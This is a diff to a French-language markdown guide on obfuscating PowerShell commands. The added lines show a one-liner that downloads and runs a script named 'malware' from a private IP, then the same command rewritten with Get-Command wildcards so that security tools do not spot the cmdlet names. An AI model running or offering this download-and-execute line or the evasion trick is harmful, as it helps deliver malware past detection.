@@ -118,9 +118,20 @@ ie""x'' "pwd"
 
 A la place d'écrire nos cmdlet telle quelle, on peut faire appel à la command **`Get-Command`** ou **`gcm`** pour les appeller.
 
-```powershell
+On peut donc remplacer :
 
+```powershell
+Invoke-RestMethod -uri https://192.168.0.66/malware | iex
 ```
+
+par  :
+
+```powershell
+&(Get-Command i************************************************************e-rest*) -uri https://192.168.0.66/malware | &(gcm i*x)
+```
+
+
+## __d__
 
 
 ## __Scripts__
